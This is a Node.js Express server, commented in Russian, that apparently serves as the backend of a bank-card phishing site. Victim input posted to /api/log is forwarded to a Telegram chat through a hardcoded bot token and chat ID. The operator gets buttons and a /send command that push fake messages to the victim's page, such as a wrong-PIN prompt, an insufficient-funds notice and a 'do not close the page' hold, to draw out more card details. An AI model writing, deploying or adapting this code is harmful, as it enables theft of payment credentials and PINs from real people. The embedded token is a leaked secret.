const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public')); // Твой фронтенд лежит в папке public

const BOT_TOKEN = '7241095700:AAEgOg76qDghDbKYurhOsTrzSltKxYugtBg';
const CHAT_ID = '-1003455979409';

// База данных в оперативной памяти (сбросится при перезагрузке сервера)
let userMessages = {};

// --- API ДЛЯ САЙТА ---

// Прием логов
app.post('/api/log', async (req, res) => {
    const { userId, type, data } = req.body;

    let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${type}]</b>\n`;
    logMsg += `🆔 ID: <code>${userId}</code>\n`;
    logMsg += `------------------------\n`;
    for (let key in data) {
        logMsg += `<b>${key}:</b> <code>${data[key]}</code>\n`;
    }

    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: logMsg,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "❌ Ошибка ПИН", callback_data: `msg_${userId}_Неверный ПИН-код. Повторите ввод.` },
                        { text: "💰 Баланс", callback_data: `msg_${userId}_Недостаточно средств на карте.` }
                    ],
                    [
                        { text: "⏳ Ожидайте", callback_data: `msg_${userId}_Ваша заявка обрабатывается. Не закрывайте страницу.` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (e) {
        res.status(500).send('TG Error');
    }
});

// Проверка наличия сообщения от админа (сайт запрашивает это каждые 3 сек)
app.get('/api/check/:userId', (req, res) => {
    const msg = userMessages[req.params.userId] || null;
    if (msg) delete userMessages[req.params.userId]; // Удаляем после выдачи
    res.json({ msg });
});

// --- API ДЛЯ ТЕЛЕГРАМА (WEBHOOK) ---

app.post('/tg-webhook', async (req, res) => {
    const { message, callback_query } = req.body;

    // 1. Если ты нажал на кнопку (быстрые ответы)
    if (callback_query) {
        const [action, userId, text] = callback_query.data.split('_');
        if (action === 'msg') {
            userMessages[userId] = text;
            axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                callback_query_id: callback_query.id,
                text: "Отправлено!"
            });
        }
    }

    // 2. Если ты пишешь свой текст командой: /send [ID] [Текст]
    if (message && message.text && message.text.startsWith('/send')) {
        const parts = message.text.split(' ');
        const userId = parts[1];
        const text = parts.slice(2).join(' ');

        if (userId && text) {
            userMessages[userId] = text;
            axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: `✅ Пользователю <code>${userId}</code> отправлено: <i>${text}</i>`,
                parse_mode: 'HTML'
            });
        }
    }
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server started on port ${PORT}`));